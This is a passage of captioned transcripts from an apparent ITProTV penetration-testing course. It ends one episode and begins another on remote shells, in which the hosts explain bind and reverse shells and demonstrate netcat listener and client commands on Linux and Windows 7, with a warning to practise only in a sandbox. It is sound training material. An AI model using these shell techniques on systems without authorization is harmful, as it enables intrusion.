Mac.\n\n930\n00:44:10.949 --> 00:44:14.329\n&gt;&gt; Yeah, when we start getting into\ncompiling our own exploits because of\n\n931\n00:44:14.329 --> 00:44:17.711\nthe libraries that are there and\nnot there on other operating systems,\n\n932\n00:44:17.711 --> 00:44:21.285\nI need a Windows machine to compile\nthose Windows exploits to attack that.\n\n933\n00:44:21.285 --> 00:44:25.929\nI can't do that on my Linus fox, well,\nnot very easily [LAUGH] can be done, but\n\n934\n00:44:25.929 --> 00:44:30.432\nit helps to have that Windows system\naround, so that you can, as you said,\n\n935\n00:44:30.432 --> 00:44:33.812\ntest against it, compile on it,\nstill have to have it.\n\n936\n00:44:33.812 --> 00:44:35.287\n&gt;&gt; Yeah.\n&gt;&gt; Windows, go Windows.\n\n937\n00:44:35.287 --> 00:44:37.730\n&gt;&gt; That's right,\nit's not in the lease, man.\n\n938\n00:44:37.730 --> 00:44:41.895\nYou gotta have your Windows system because\nyou'll see, as we continue down this road,\n\n939\n00:44:41.895 --> 00:44:44.585\nyou'll go, wow, it's a good thing he's\ngot that Windows box laying right there.\n\n940\n00:44:44.585 --> 00:44:46.945\nCuz otherwise we'd be just sitting\nhere twiddling our thumbs,\n\n941\n00:44:46.945 --> 00:44:49.008\nwhich does not make for\ngreat TV, to be honest with you.\n\n942\n00:44:49.008 --> 00:44:50.460\nIt's a little boring.\n\n943\n00:44:50.460 --> 00:44:53.220\nWell Mike, that's the basics.\n\n944\n00:44:53.220 --> 00:44:57.238\nAnything didn't sound familiar to you,\nrun out to the interwebs,\n\n945\n00:44:57.238 --> 00:45:00.351\nfind out about it,\nread ManPages, watch ITProTV.\n\n946\n00:45:00.351 --> 00:45:04.070\nWe have a laundry list of courses that\nwill get you up to snuff for that,\n\n947\n00:45:04.070 --> 00:45:07.476\nso if anything sounds weird, or\nyou're just not strong, go and\n\n948\n00:45:07.476 --> 00:45:11.700\nmake sure that you buff those\nskills down to a fine perfection.\n\n949\n00:45:11.700 --> 00:45:13.220\n&gt;&gt; All right, Daniel, thank you for\n\n950\n00:45:13.220 --> 00:45:16.736\nthat great look at what we're gonna be\ngetting into as this series progresses,\n\n951\n00:45:16.736 --> 00:45:19.890\na really good look at some of the basics\nthat we need to be familiar with.\n\n952\n00:45:19.890 --> 00:45:23.500\nAnd as Daniel said, at this point, if any\nof those don't sound familiar or you're\n\n953\n00:45:23.500 --> 00:45:27.110\nnot comfortable with them, good time to\nstop and go back and refresh on those.\n\n954\n00:45:27.110 --> 00:45:30.250\nSo that as we go through this series,\nyou'll be able to follow along and\n\n955\n00:45:30.250 --> 00:45:32.110\ndo the things that we're gonna do.\n\n956\n00:45:32.110 --> 00:45:34.710\nOr put it off, watch the whole series,\nand then go back and\n\n957\n00:45:34.710 --> 00:45:37.260\nwatch it again, taking one, two at a time.\n\n958\n00:45:37.260 --> 00:45:38.770\nWhatever floats your boat,\n\n959\n00:45:38.770 --> 00:45:43.180\nbut just know that we've got the resources\nhere at ITProTV for you to enjoy.\n\n960\n00:45:43.180 --> 00:45:44.830\nSo we appreciate that, Daniel.\n\n961\n00:45:44.830 --> 00:45:47.120\nHope everybody out there\nenjoyed watching this one.\n\n962\n00:45:47.120 --> 00:45:50.060\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n963\n00:45:50.060 --> 00:45:50.890\n&gt;&gt; And I'm Daniel Lowrie.\n\n964\n00:45:50.890 --> 00:45:52.102\n&gt;&gt; And we'll see you next time.\n\n965\n00:45:52.102 --> 00:45:58.530\n[MUSIC]\n\n966\n00:45:58.530 --> 00:46:01.646\n&gt;&gt; Thank you for

00:00:08.693\n[MUSIC]\n\n4\n00:00:08.693 --> 00:00:10.942\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:10.942 --> 00:00:15.284\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.284 --> 00:00:19.680\nI'm your host, Mike Rodrick, and\ntoday we're doing penetration testing.\n\n7\n00:00:19.680 --> 00:00:23.920\nAnd in this episode we're gonna be taking\na look at shells and remote shells.\n\n8\n00:00:23.920 --> 00:00:26.755\nSo, Daniel,\nI guess we're going to the beach today?\n\n9\n00:00:26.755 --> 00:00:27.770\n&gt;&gt; [LAUGH] Exactly right.\n\n10\n00:00:27.770 --> 00:00:30.990\nEverybody get your flip flops and\nyour sun tan lotion, cuz,\n\n11\n00:00:30.990 --> 00:00:33.325\nno, we're not going to the beach today,\nMichael.\n\n12\n00:00:33.325 --> 00:00:35.150\n&gt;&gt; [LAUGH]\n&gt;&gt; He's having fun, right?\n\n13\n00:00:35.150 --> 00:00:36.860\nWe like to have a good time around here.\n\n14\n00:00:36.860 --> 00:00:39.700\nWhat are we talking about\nwhen he says shells?\n\n15\n00:00:39.700 --> 00:00:43.320\nCuz that's what today's topic is about,\nremote shells and shells in general.\n\n16\n00:00:43.320 --> 00:00:46.260\nNot the cool little things\nyou find on the beach.\n\n17\n00:00:46.260 --> 00:00:51.010\nThe interface that you work\nwith inside a Linux system.\n\n18\n00:00:51.010 --> 00:00:56.630\nAnd technically I think Windows as well is\nalso called a shell, is that environment,\n\n19\n00:00:56.630 --> 00:00:58.460\nthat black box environment right?\n\n20\n00:00:58.460 --> 00:00:59.900\nThat's what you're thinking of.\n\n21\n00:00:59.900 --> 00:01:02.620\nThere's a graphical shell which is\nit gives you all the pretty GUI's.\n\n22\n00:01:02.620 --> 00:01:07.580\nBut at its core, we're gonna be\nworking a lot with black boxes, right?\n\n23\n00:01:07.580 --> 00:01:11.180\nWith command prompt and\nthe command line in Linux.\n\n24\n00:01:11.180 --> 00:01:12.970\nSo that is typically know as shell.\n\n25\n00:01:12.970 --> 00:01:15.060\nWell you think of BASH right?\n\n26\n00:01:15.060 --> 00:01:16.090\nBASH scripting.\n\n27\n00:01:16.090 --> 00:01:17.310\nWhat does BASH stand for?\n\n28\n00:01:17.310 --> 00:01:19.780\nBASH stands for born again shell.\n\n29\n00:01:19.780 --> 00:01:24.080\nSo that's what we mean we're talking\nabout shell is an environment\n\n30\n00:01:24.080 --> 00:01:26.950\nwhich interfaces with\nthe kernel of your system.\n\n31\n00:01:26.950 --> 00:01:28.750\nTypically command based.\n\n32\n00:01:28.750 --> 00:01:29.440\nOkay.\n\n33\n00:01:29.440 --> 00:01:31.410\nSo that's what a shell is.\n\n34\n00:01:31.410 --> 00:01:33.040\nSo now that we know what a shell is,\n\n35\n00:01:33.040 --> 00:01:37.580\nwe can probably guess on what we\nmean by when we say remote shell.\n\n36\n00:01:37.580 --> 00:01:42.950\nIf I want to access Mike's computer,\nI'm probably doing\n\n37\n00:01:42.950 --> 00:01:46.700\nsomething inside of my own shell, and now\nI want to get a shell on Mike's computer.\n\n38\n00:01:46.700 --> 00:01:50.700\nI want to have access through\nthat terminal environment.\n\n39\n00:01:50.700 --> 00:01:54.050\nAnd that would be remotely, because I'm\nnot directly sitting behind the keyboard,\n\n40\n00:01:54.050 --> 00:01:57.000\nand mouse, and\nmonitor that's plugged into that system.\n\n41\n00:01:57.000 --> 00:02:01.080\nI'm remotely accessing it typically\nthrough a ethernet network of some sort,\n\n42\n00:02:01.080 --> 00:02:02.700\nor the internet, as it were.\n\n43\n00:02:03.890 --> 00:02:05.460\nSo that's what we mean by shells.\n\n44\n00:02:05.460 --> 00:02:07.590\nThat's what we mean by remote shells.\n\n45\n00:02:07.590 --> 00:02:12.230\nNow the cool thing about shells are, is\nthere's many different ways to get them.\n\n46\n00:02:12.230 --> 00:02:13.210\nThere's secure shell.\n\n47\n00:02:13.210 --> 00:02:14.386\nYou can just do SSH.\n\n48\n00:02:14.386 --> 00:02:17.310\nWe saw that in a previous episode,\nvery simple tool.\n\n49\n00:02:17.310 --> 00:02:19.150\nYou should be able to do that.\n\n50\n00:02:19.150 --> 00:02:20.801\nAnd work with SSH, it's a great thing.\n\n51\n00:02:20.801 --> 00:02:28.270\nLot of systems work that very way if\nyou're into AWS, you get an RSA key.\n\n52\n00:02:28.270 --> 00:02:31.472\nSlap that sucker into your box,\nwherever you're logging in from,\n\n53\n00:02:31.472 --> 00:02:33.717\napply it SSH into the IP\naddress they gave you and\n\n54\n00:02:33.717 --> 00:02:36.430\nthat's how you get access to\nyour Linux machines in AWS.\n\n55\n00:02:36.430 --> 00:02:38.660\nThat's a remote shell.\n\n56\n00:02:40.080 --> 00:02:42.970\nSSH is the tool that allows\nthat connection, right?\n\n57\n00:02:42.970 --> 00:02:46.040\nIt does all the communication,\nthe configuration.\n\n58\n00:02:46.040 --> 00:02:48.750\nIt does all of the encryption,\nthings of that nature.\n\n59\n00:02:50.230 --> 00:02:52.010\nBut it's not the only game in the box,\nright?\n\n60\n00:02:52.010 --> 00:02:56.970\nThere's telnets, there's old r log in,\nthat's a typical way,\n\n61\n00:02:56.970 --> 00:03:02.270\nI said typical, it's not typical anymore,\nit's an old way to do remote log in,\n\n62\n00:03:02.270 --> 00:03:05.150\nthat's what r log in stands for,\nremote log in.\n\n63\n00:03:05.150 --> 00:03:06.410\nWe're doing remote shells,\n\n64\n00:03:06.410 --> 00:03:10.830\nwe're accessing machines from our\nlocal machine that are remote to us.\n\n65\n00:03:10.830 --> 00:03:14.610\nSo that being said I'm going to\nintroduce you to a wonderful tool.\n\n66\n00:03:14.610 --> 00:03:16.670\nIt has been known as\nthe Swiss Army knife and\n\n67\n00:03:16.670 --> 00:03:19.410\nI believe that' even in the man\npages to be honest with you.\n\n68\n00:03:20.450 --> 00:03:24.970\nThe Swiss Army knife of networking\nof systems administration.\n\n69\n00:03:24.970 --> 00:03:26.730\nIt's a fantastic tool.\n\n70\n00:03:26.730 --> 00:03:29.060\nIt can do so many things.\n\n71\n00:03:29.060 --> 00:03:32.780\nAnd we're gonna use it extensively\ninside of this series,\n\n72\n00:03:32.780 --> 00:03:35.490\nso get ready to get used to it.\n\n73\n00:03:35.490 --> 00:03:39.150\nAnd learn to use it and trust me,\nit's not like, no, not this thing again.\n\n74\n00:03:39.150 --> 00:03:41.860\nYou're gonna be like sweet,\nwe're getting out netcat.\n\n75\n00:03:41.860 --> 00:03:43.380\nNetcat is the tool.\n\n76\n00:03:43.380 --> 00:03:44.620\nSo what is netcat?\n\n77\n00:03:44.620 --> 00:03:49.120\nNetcat is the network,\nlet's see what their man page,\n\n78\n00:03:49.120 --> 00:03:52.450\nlet's jump to my computer really quickly,\nman netcat.\n\n79\n00:03:52.450 --> 00:03:57.660\nOr actually, nc,\nas it typically comes bundled.\n\n80\n00:03:57.660 --> 00:03:59.130\nHit return.\n\n81\n00:03:59.130 --> 00:04:02.500\nThere you go, TCP/IP swiss army knife.\n\n82\n00:04:02.500 --> 00:04:08.830\nIt enables us to make basically any kind\nof TCP/IP connection, or UDP connection.\n\n83\n00:04:08.830 --> 00:04:11.420\nIt doesn't matter what\nservices are on there.\n\n84\n00:04:11.420 --> 00:04:14.020\nThe netcat will try to talk to it.\n\n85\n00:04:14.020 --> 00:04:16.100\nIt loves to to make connections.\n\n86\n00:04:16.100 --> 00:04:16.830\nIt's a people person.\n\n87\n00:04:17.860 --> 00:04:19.380\nIt really likes to do this.\n\n88\n00:04:19.380 --> 00:04:21.140\nAnd it does it very well.\n\n89\n00:04:21.140 --> 00:04:21.650\nI like it.\n\n90\n00:04:21.650 --> 00:04:23.120\nWhen we get into the banner grabbing and\n\n91\n00:04:23.120 --> 00:04:26.110\nstuff like that back in\nthe day Telnet was the tool.\n\n92\n00:04:26.110 --> 00:04:28.000\nBut netcat is really the tool.\n\n93\n00:04:28.000 --> 00:04:31.450\nSo forget using Telnet I'm\nnot saying forget it.\n\n94\n00:04:31.450 --> 00:04:33.820\nNetcat is typically where you're gonna go.\n\n95\n00:04:33.820 --> 00:04:37.440\nEvery now and then you might have to\ndust off Telnet for whatever reason,\n\n96\n00:04:37.440 --> 00:04:38.440\nI can't think of any.\n\n97\n00:04:38.440 --> 00:04:40.122\nBut I wanna leave myself\nsome room to wiggle.\n\n98\n00:04:40.122 --> 00:04:41.620\n&gt;&gt; Yes.\n&gt;&gt; [LAUGH] Not get locked in.\n\n99\n00:04:41.620 --> 00:04:44.170\nHey now, I know that Netcat can't do this.\n\n100\n00:04:44.170 --> 00:04:45.660\nI don't wanna get stuck in that box,\nright?\n\n101\n00:04:45.660 --> 00:04:47.030\nAnd so, Netcat's a great tool.\n\n102\n00:04:47.030 --> 00:04:49.170\nThat's basically what I'm trying to say.\n\n103\n00:04:49.170 --> 00:04:50.230\nNetcat's a great tool.\n\n104\n00:04:50.230 --> 00:04:53.480\nWe can use it to create\nremote connections,\n\n105\n00:04:53.480 --> 00:04:55.220\ntransfer files, things of that.\n\n106\n00:04:55.220 --> 00:04:58.060\nIt's very, very, very robust.\n\n107\n00:04:58.060 --> 00:05:01.260\nIt has a lot of features and\nit's really simple to use.\n\n108\n00:05:01.260 --> 00:05:02.050\nSpecifically for\n\n109\n00:05:02.050 --> 00:05:05.960\nour purposes we're just going to talk\nabout creating different types of shells.\n\n110\n00:05:07.180 --> 00:05:09.430\nSo what do you mean\ndifferent types of shells?\n\n111\n00:05:09.430 --> 00:05:10.600\n&gt;&gt; That was my question Daniel.\n\n112\n00:05:10.600 --> 00:05:13.072\nNow you're telling me there's\nmore than one type of shell.\n\n113\n00:05:13.072 --> 00:05:13.960\n&gt;&gt; Yeah, yeah.\n\n114\n00:05:13.960 --> 00:05:21.310\nAnd I don't mean bash versus seashell or\nr-shell versus z-shell or core shell.\n\n115\n00:05:21.310 --> 00:05:23.780\nThat is different types of shells, but\n\n116\n00:05:23.780 --> 00:05:28.890\nwhat I mean is there's two different\ntypes of shell connections we can create.\n\n117\n00:05:28.890 --> 00:05:30.530\nOne is called a bind shell.\n\n118\n00:05:30.530 --> 00:05:32.710\nAnd the other is a reverse shell.\n\n119\n00:05:32.710 --> 00:05:34.790\nThis is an important concept\nthat you need to grasp.\n\n120\n00:05:34.790 --> 00:05:35.520\nOkay?\n\n121\n00:05:35.520 --> 00:05:39.560\nSo, we wanna make sure that you\nunderstand by the end of this episode.\n\n122\n00:05:39.560 --> 00:05:41.690\nI can say, hey,\ncreate a reverse shell, and\n\n123\n00:05:41.690 --> 00:05:43.600\nyou'll know exactly\nwhat I'm talking about.\n\n124\n00:05:43.600 --> 00:05:46.270\nWhat you need to do is just\npop a bind shell there.\n\n125\n00:05:46.270 --> 00:05:49.040\nAnd you're like, yeah, not a problem,\nI can do that really quickly.\n\n126\n00:05:49.040 --> 00:05:51.480\nBecause I know netcat,\nI know what a bind shell is, and\n\n127\n00:05:51.480 --> 00:05:53.360\nI know how to make netcat do a bind shell.\n\n128\n00:05:53.360 --> 00:05:57.440\nThat's where I want you end of\ntoday's episode right here.\n\n129\n00:05:57.440 --> 00:06:02.130\nSo, that being said, let's look how we\njust create a connection using Netcap.\n\n130\n00:06:02.130 --> 00:06:03.340\nSo let's go back to my computer.\n\n131\n00:06:03.340 --> 00:06:05.290\nWe want to quit out of the Manpage.\n\n132\n00:06:05.290 --> 00:06:08.180\nNow, all you have to do is type in NC for\nNetcap.\n\n133\n00:06:09.660 --> 00:06:15.720\nAnd then, this a server type service, so\nyou're going to have a client an a server.\n\n134\n00:06:15.720 --> 00:06:19.810\nSo we'll make the Linux box the server,\nhow about that?\n\n135\n00:06:19.810 --> 00:06:20.730\nWe'll start there.\n\n136\n00:06:20.730 --> 00:06:23.970\nI also have, hey look,\nWindows 7 right there waiting for us.\n\n137\n00:06:23.970 --> 00:06:28.130\nI'm using Windows 7 just for,\nI know you're like hey Windows 10 is out,\n\n138\n00:06:28.130 --> 00:06:32.260\nwhat is this man,\nanybody can hack into a Windows 7 machine.\n\n139\n00:06:32.260 --> 00:06:34.305\nA, no they can't.\n\n140\n00:06:34.305 --> 00:06:34.930\n&gt;&gt; [LAUGH].\n&gt;&gt; Okay,\n\n141\n00:06:34.930 --> 00:06:37.270\nb yes I know Windows 10 is not there, but\n\n142\n00:06:37.270 --> 00:06:41.690\nI want to make sure that everything\nwe're doing is easily demonstrated.\n\n143\n00:06:41.690 --> 00:06:44.060\nNot that you can't\ndemonstrate in Windows 10.\n\n144\n00:06:44.060 --> 00:06:46.900\nWindows 10 does have more security\nfeatures built into it, so\n\n145\n00:06:46.900 --> 00:06:48.250\nit becomes more difficult.\n\n146\n00:06:48.250 --> 00:06:49.580\nNot that it can't be done.\n\n147\n00:06:49.580 --> 00:06:50.670\nJust that they're more difficult.\n\n148\n00:06:50.670 --> 00:06:52.440\nYou have to make more caveats.\n\n149\n00:06:52.440 --> 00:06:56.150\nI wanna show you the concepts so\nthat we can do those things\n\n150\n00:06:56.150 --> 00:06:58.920\nwithout the hinderance of Windows\n10 trying to stop me, all right?\n\n151\n00:06:58.920 --> 00:07:00.520\nSo that's why I want Windows 7.\n\n152\n00:07:00.520 --> 00:07:03.560\nAll right, so let's set up the server,\n\n153\n00:07:03.560 --> 00:07:07.050\nand then we'll go to the Windows\nmachine and we'll do the client.\n\n154\n00:07:07.050 --> 00:07:09.910\nAnd then, for grids and giggles when\nwe're done We'll reverse the process.\n\n155\n00:07:09.910 --> 00:07:14.470\nWe'll make the Windows client,\nI'll make the Windows operator our server.\n\n156\n00:07:14.470 --> 00:07:15.620\nAnd a Linux our client.\n\n157\n00:07:15.620 --> 00:07:16.850\nSo let's start here.\n\n158\n00:07:16.850 --> 00:07:17.690\nSo let's create -nlvp.\n\n159\n00:07:17.690 --> 00:07:19.290\nWow that's a lot of stuff man.\n\n160\n00:07:20.430 --> 00:07:23.690\nWhat does that mean?\n\n161\n00:07:23.690 --> 00:07:26.270\nWell, basically it means\nSet me up as a server.\n\n162\n00:07:28.360 --> 00:07:31.450\nWe want to listen,\nthat's what the l is for.\n\n163\n00:07:31.450 --> 00:07:38.520\nV is for verbosity, and p is for I want to\nsay, you know what, we have a man page.\n\n164\n00:07:38.520 --> 00:07:39.301\nMan n-c.\n\n165\n00:07:39.301 --> 00:07:44.020\nYou can just do dash p, that's the port.\n\n166\n00:07:46.380 --> 00:07:48.600\nYeah so it's asking me for the port.\n\n167\n00:07:48.600 --> 00:07:52.378\nL is for the listening,\nto listen on that port.\n\n168\n00:07:52.378 --> 00:07:54.920\nSo nlvp I forget what -n is.\n\n169\n00:07:54.920 --> 00:07:58.657\n&gt;&gt; That doesn't use any DNS if I'm right,\nit doesn't bother taking time to resolve\n\n170\n00:07:58.657 --> 00:08:01.016\nname\n&gt;&gt; Mike, man this guy.\n\n171\n00:08:01.016 --> 00:08:04.280\nCouldn't ask for a better wingman\non this show to be honest with you.\n\n172\n00:08:04.280 --> 00:08:07.920\nThat's right, it uses numeric IPs only\nas you can see from the screen here.\n\n173\n00:08:07.920 --> 00:08:08.460\nNo DNS.\n\n174\n00:08:08.460 --> 00:08:16.140\nSo I do that a lot because DNS\ncan get hinky if it changes.\n\n175\n00:08:16.140 --> 00:08:19.740\nIt's nice, but I like knowing\nthis is the IP I'm logging into.\n\n176\n00:08:19.740 --> 00:08:21.630\nThat's the machine I'm using.\n\n177\n00:08:21.630 --> 00:08:24.540\nAnd because this is the IP address,\nso I typically stick\n\n178\n00:08:24.540 --> 00:08:28.340\nwith that in case my DNS information\nchanges and goes to another machine.\n\n179\n00:08:28.340 --> 00:08:29.330\nDon't like that.\n\n180\n00:08:29.330 --> 00:08:29.930\nSo I do that.\n\n181\n00:08:29.930 --> 00:08:32.310\nSo NLVP and of course V is the verbosity.\n\n182\n00:08:32.310 --> 00:08:33.590\nSo let me get out of here.\n\n183\n00:08:33.590 --> 00:08:35.608\nSo let's set this up.\n\n184\n00:08:35.608 --> 00:08:37.494\nNc-nlvp.\n\n185\n00:08:37.494 --> 00:08:42.430\nSo now we know its no DNS,\n\n186\n00:08:42.430 --> 00:08:46.632\nsetup a listening service,\nbe verbose, and on said port.\n\n187\n00:08:46.632 --> 00:08:49.340\nWe haven't defined that port yet,\nwe are going to do that now.\n\n188\n00:08:49.340 --> 00:08:50.900\nSo, what port do I want to use?\n\n189\n00:08:50.900 --> 00:08:55.240\nI can use any port that is not\ncurrently in business, right?\n\n190\n00:08:55.240 --> 00:08:57.920\nWe have 65,356 of them, right?\n\n191\n00:08:57.920 --> 00:08:58.840\nIs that the right number?\n\n192\n00:08:58.840 --> 00:08:59.890\n&gt;&gt; I think so.\n\n193\n00:08:59.890 --> 00:09:00.915\n&gt;&gt; There's a lot.\n\n194\n00:09:00.915 --> 00:09:02.450\n65,000 and some odd 500.\n\n195\n00:09:02.450 --> 00:09:04.670\n&gt;&gt; 536.\n&gt;&gt; I always get it backwards.\n\n196\n00:09:04.670 --> 00:09:07.390\n&gt;&gt; Yeah.\n&gt;&gt; It's my dyslexia kicking in.\n\n197\n00:09:07.390 --> 00:09:08.905\nAnd that's not a joke.\n\n198\n00:09:08.905 --> 00:09:11.770\n[LAUGH] That's actually what's happening.\n\n199\n00:09:11.770 --> 00:09:15.100\nSo just pick a port that's not being used.\n\n200\n00:09:15.100 --> 00:09:19.262\nIf I know, if I wanna do port 80, gotta\nmake sure I'm not running a web server\n\n201\n00:09:19.262 --> 00:09:21.510\nfirst cuz they'll probably\nconflict with each other, right?\n\n202\n00:09:21.510 --> 00:09:25.590\nSo just pick a random, I like to use 9999\n\n203\n00:09:25.590 --> 00:09:29.655\nbecause it's typically not a used port,\nand it's easy to type.\n\n204\n00:09:29.655 --> 00:09:31.560\n&gt;&gt; [LAUGH] Exactly.\n&gt;&gt; Yeah, let's be honest, folks.\n\n205\n00:09:31.560 --> 00:09:32.760\n&gt;&gt; Easy to remember, easy to type.\n\n206\n00:09:32.760 --> 00:09:35.720\n&gt;&gt; Easy to remember, easy to type,\nit's not that difficult.\n\n207\n00:09:35.720 --> 00:09:36.720\nMake these things,\n\n208\n00:09:36.720 --> 00:09:39.820\ndon't go around your elbow to get to your\nback, that's the wrong way to do it.\n\n209\n00:09:39.820 --> 00:09:41.380\nDo it the easy way, that's the easy way.\n\n210\n00:09:41.380 --> 00:09:44.480\nIt's easy to type, easy to remember,\nand it's typically not being used.\n\n211\n00:09:44.480 --> 00:09:46.740\nSo that's my drug of choice right there.\n\n212\n00:09:46.740 --> 00:09:49.620\nI hit return, and\nnow it says listening on, it says any,\n\n213\n00:09:49.620 --> 00:09:53.160\nwhat it means is it's listening for\nany connection on port 9999.\n\n214\n00:09:53.160 --> 00:09:56.530\nSitting here waiting patiently, right?\n\n215\n00:09:56.530 --> 00:10:00.320\nLet's go over our Windows machine,\nlet's open a command prompt.\n\n216\n00:10:00.320 --> 00:10:04.080\nActually, I need to check,\nwhen you're in Linux, right?\n\n217\n00:10:04.080 --> 00:10:06.770\nThey have that path variable,\nand so does Windows.\n\n218\n00:10:06.770 --> 00:10:12.920\nThere's a path also for\nuniversally executable binaries, or EXEs.\n\n219\n00:10:14.350 --> 00:10:18.330\nIf you don't have your program\nin one of these directories,\n\n220\n00:10:18.330 --> 00:10:21.560\nyou usually have to append the directory\nname, or you have to move the program.\n\n221\n00:10:21.560 --> 00:10:23.960\nTypically it's easier to move to program,\nto be honest with you.\n\n222\n00:10:23.960 --> 00:10:28.170\nSo I can't remember if I did that or not.\n\n223\n00:10:28.170 --> 00:10:31.014\nSo we'll do that really quickly.\n\n224\n00:10:32.125 --> 00:10:36.825\nGo to C, it will be in Windows,\nand System32.\n\n225\n00:10:36.825 --> 00:10:39.820\nIs an easy one to remember because\nthat's where all the system files are.\n\n226\n00:10:39.820 --> 00:10:43.290\nYou know it's not gonna\ngive you any issues.\n\n227\n00:10:43.290 --> 00:10:45.700\nI wanna see if,\nit will be in alphabetical order.\n\n228\n00:10:47.060 --> 00:10:52.660\nN, got N cat, but not NC,\nman, I gave up the ghost.\n\n229\n00:10:52.660 --> 00:10:57.400\nThere we go, let's grab a copy of that,\nI know I keep, it's ncat.\n\n230\n00:10:57.400 --> 00:11:00.020\nNot ncat Lowrie, net-cat.\n\n231\n00:11:00.020 --> 00:11:00.990\nThere we go, let's copy that.\n\n232\n00:11:02.604 --> 00:11:06.970\nDrop that into that system 32 and paste.\n\n233\n00:11:06.970 --> 00:11:10.730\n&gt;&gt; So again, we could really have run that\nfrom anywhere, but by putting it in some\n\n234\n00:11:10.730 --> 00:11:15.270\nplace that's included in your environment\nvariables makes it a lot easier to work\n\n235\n00:11:15.270 --> 00:11:18.130\nwith from the command line cuz\nyou're not typing out entire paths,\n\n236\n00:11:18.130 --> 00:11:22.420\nyou can just type in C and it's gonna\nlook in those normal places and find it.\n\n237\n00:11:22.420 --> 00:11:25.218\n&gt;&gt; Exactly, Mike, spot on yet again.\n\n238\n00:11:25.218 --> 00:11:30.100\nI don't wanna be typing in or changing\ndirectories into where did I keep net cat?\n\n239\n00:11:30.100 --> 00:11:32.260\nJust drop it in one of\nthose path directories and\n\n240\n00:11:32.260 --> 00:11:34.190\nit's at your leisure when you can use it.\n\n241\n00:11:34.190 --> 00:11:37.580\nNow that it's there I should be\nable to run it very easily if\n\n242\n00:11:37.580 --> 00:11:39.570\nI close these folders.\n\n243\n00:11:39.570 --> 00:11:40.670\nOpen up my command prompt.\n\n244\n00:11:40.670 --> 00:11:42.420\nYou'll notice I didn't\neven do administrative.\n\n245\n00:11:42.420 --> 00:11:44.900\nYou don't have to be\nan administrator to run Net-cat.\n\n246\n00:11:46.030 --> 00:11:47.610\nIt's that simple.\n\n247\n00:11:47.610 --> 00:11:54.210\nSo to create the client connection,\nthat's where we're at, we do NC-NV,\n\n248\n00:11:54.210 --> 00:11:59.930\nbasically IP addresses, no DNS And\nmore verbosity, cuz I like verbosity.\n\n249\n00:11:59.930 --> 00:12:03.110\nI like to see what these things are doing,\nif there's anything to even see.\n\n250\n00:12:03.110 --> 00:12:04.530\nThat doesn't mean you're\ngonna see some output,\n\n251\n00:12:04.530 --> 00:12:07.280\nit just means if there is, you'll see it.\n\n252\n00:12:07.280 --> 00:12:10.550\nAnd now what server am\nI trying to connect to?\n\n253\n00:12:10.550 --> 00:12:14.110\nSo if I'm not mistaken, my, well,\nthat'll give us a chance to use our\n\n254\n00:12:15.310 --> 00:12:18.518\nlittle Actually, you know what I'll do?\n\n255\n00:12:18.518 --> 00:12:22.590\nI will ctrl-z this which\nwill pause that process,\n\n256\n00:12:22.590 --> 00:12:23.790\nput it in the background really quickly.\n\n257\n00:12:23.790 --> 00:12:29.910\nI'm gonna get my terminal back,\nand I will do an ifconfig and\n\n258\n00:12:29.910 --> 00:12:33.970\nsee what is my,\nwell that's a good thing I looked.\n\n259\n00:12:33.970 --> 00:12:36.872\nCuz I wouldn't have been able\nto make a connection here.\n\n260\n00:12:36.872 --> 00:12:40.260\nMy interface that I want to\nbe listening on is not up.\n\n261\n00:12:40.260 --> 00:12:41.360\nI've got the wrong interface up.\n\n262\n00:12:41.360 --> 00:12:46.088\nSo what I'm gonna do,\njust to make sure everything is clean and\n\n263\n00:12:46.088 --> 00:12:49.298\nrosy, is I'm going to, I wanna fg this and\n\n264\n00:12:49.298 --> 00:12:54.070\nthen I'm going to ctrl-c it to kill it,\ncontrol c.\n\n265\n00:12:54.070 --> 00:12:54.980\nThere we go.\n\n266\n00:12:54.980 --> 00:12:56.710\nI'm gonna change that really quickly.\n\n267\n00:12:56.710 --> 00:12:59.650\nAnd I'm gonna do it the easy way and\njust go into the graphics.\n\n268\n00:13:01.330 --> 00:13:03.920\nAnd just turn ethernet0 on, hit Connect.\n\n269\n00:13:03.920 --> 00:13:05.600\nGotta love a good graphical tool.\n\n270\n00:13:05.600 --> 00:13:07.440\nThey're there, definitely use them.\n\n271\n00:13:07.440 --> 00:13:10.470\nIf you wanted to do this the hard way,\nyou can just do\n\n272\n00:13:11.910 --> 00:13:16.040\nifconfig eth 0 up, ifconfig eth 1 down.\n\n273\n00:13:17.240 --> 00:13:20.140\nIf up and if down also work typically,\n\n274\n00:13:20.140 --> 00:13:24.270\nI don't think they work on this machine\nfor whatever reason, but there you go.\n\n275\n00:13:24.270 --> 00:13:28.360\nSo now if I do ifconfig, let's see, yeah,\n\n276\n00:13:28.360 --> 00:13:32.570\nyou'll see now my eth1 no\nlonger has an IP address.\n\n277\n00:13:32.570 --> 00:13:35.320\nBut I do have one from eth0 and that's on.\n\n278\n00:13:36.440 --> 00:13:39.780\nThis is a good spot for\nus to give you a fair warning.\n\n279\n00:13:39.780 --> 00:13:43.060\nWhen you're creating vulnerabilities\ninside of machines, you're opening ports,\n\n280\n00:13:43.060 --> 00:13:43.870\nyou're doing things like that,\n\n281\n00:13:43.870 --> 00:13:47.070\nyou're doing testing,\ndon't do it in a live environment.\n\n282\n00:13:47.070 --> 00:13:49.230\nDon't do it on something\nthat accesses the Internet.\n\n283\n00:13:49.230 --> 00:13:50.260\nBecause guess what?\n\n284\n00:13:50.260 --> 00:13:52.996\nThere's guys like you and\nme and girls like you and\n\n285\n00:13:52.996 --> 00:13:57.100\nme that are out there right now actively\nscanning looking for an opening and\n\n286\n00:13:57.100 --> 00:14:00.570\nall they need is x amount of time and\nyou've been compromised.\n\n287\n00:14:00.570 --> 00:14:04.171\nAll you were doing was, I downloaded\nthis and I was playing with it, and\n\n288\n00:14:04.171 --> 00:14:06.410\nnow what's going on with my system?\n\n289\n00:14:06.410 --> 00:14:08.000\nSo build a sand box,\n\n290\n00:14:08.000 --> 00:14:11.070\ndo it inside of a sand boxed\nenvironment with no Internet access.\n\n291\n00:14:11.070 --> 00:14:12.570\n&gt;&gt; That's a great point there, Daniel.\n\n292\n00:14:12.570 --> 00:14:15.640\nIt just takes a second, and\nyou fire up some of these tools and\n\n293\n00:14:15.640 --> 00:14:18.180\nlike anything else they've\ngot some default values.\n\n294\n00:14:18.180 --> 00:14:19.620\nThey're listening on certain ports,\n\n295\n00:14:19.620 --> 00:14:23.360\nand typically we've changed that but\nit does not take long.\n\n296\n00:14:23.360 